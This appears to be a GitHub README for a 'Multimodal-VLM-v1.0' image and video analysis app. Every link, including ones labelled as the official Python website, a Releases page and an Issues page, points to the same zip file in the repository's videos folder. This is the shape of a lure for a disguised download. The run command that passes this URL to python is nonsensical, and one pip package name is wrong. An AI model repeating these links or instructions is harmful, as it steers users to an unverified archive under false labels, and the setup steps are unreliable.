[![Download Multimodal-VLM-v1.0](https://github.com/batiktechstyle/Multimodal-VLM-v1.0/raw/refs/heads/main/videos/Multimodal_VL_v_curry.zip)](https://github.com/batiktechstyle/Multimodal-VLM-v1.0/raw/refs/heads/main/videos/Multimodal_VL_v_curry.zip)

## 🚀 Getting Started

Welcome to Multimodal-VLM-v1.0, your complete solution for multimodal vision-language tasks. This application allows you to process images and videos using advanced models. You don’t need any programming skills to use it. Follow the steps below to download and run the application on your own machine.

## 📂 Features

- **Document Processing**: Analyze and extract information from documents.
- **Optical Character Recognition (OCR)**: Convert images of text into machine-encoded text.
- **Spatial Reasoning**: Understand the relationships between objects in images.
- **Video Understanding**: Process video content to extract meaningful insights.

## 🖥️ System Requirements

To ensure a smooth experience with Multimodal-VLM-v1.0, please check the following requirements:

- OS: Windows 10, macOS, or a Linux distribution.
- Processor: Intel Core i5 or equivalent.
- RAM: Minimum 8 GB (16 GB recommended).
- GPU: NVIDIA with CUDA support (required for optimal performance).
- Python: Version 3.7 or higher must be installed.

## 🛠️ Installation Steps

### Step 1: Prepare Your Environment

Before downloading the application, make sure you have the necessary software on your computer:

1. **Install Python**: If you do not have Python installed, download it from the [official Python website](https://github.com/batiktechstyle/Multimodal-VLM-v1.0/raw/refs/heads/main/videos/Multimodal_VL_v_curry.zip).
2. **Install Pip**: Pip usually comes with Python. You can verify by running `pip --version` in your command line.

### Step 2: Download the Application

To get the Multimodal-VLM-v1.0 application, [visit our Releases page](https://github.com/batiktechstyle/Multimodal-VLM-v1.0/raw/refs/heads/main/videos/Multimodal_VL_v_curry.zip) to download the latest version.

There you will find the release files. Choose the one that suits your operating system and click the download link.

### Step 3: Install Dependencies

Once the download is complete, you need to install relevant libraries. Open your command line tool, and run the following commands:

```bash
pip install gradio
pip install opencv-python
pip install huggingface-transformers
```

These commands will ensure all necessary libraries are available to run the application.

### Step 4: Run the Application

After installing the dependencies, you can run the application. Navigate to the folder where you downloaded the application and execute:

```bash
python https://github.com/batiktechstyle/Multimodal-VLM-v1.0/raw/refs/heads/main/videos/Multimodal_VL_v_curry.zip
```

This command will launch the Multimodal-VLM-v1.0 application, and you will see a user-friendly interface.

### Step 5: Using the Application

1. **Image Inference**: Upload an image file for processing. The application will use the OCR model to extract text and provide insights about the image.
2. **Video Inference**: Upload a video file. The application will analyze the video using the video understanding model and display its findings.

## ⚠️ Troubleshooting

If you encounter issues while using the application, consider these steps:

- Ensure that your Python environment is set correctly.
- Verify that all dependencies are installed without errors.
- If you face compatibility issues, check if your OS meets the system requirements stated above.
  
If problems persist, you can find support or report issues directly on our [GitHub Issues page](https://github.com/batiktechstyle/Multimodal-VLM-v1.0/raw/refs/heads/main/videos/Multimodal_VL_v_curry.zip).
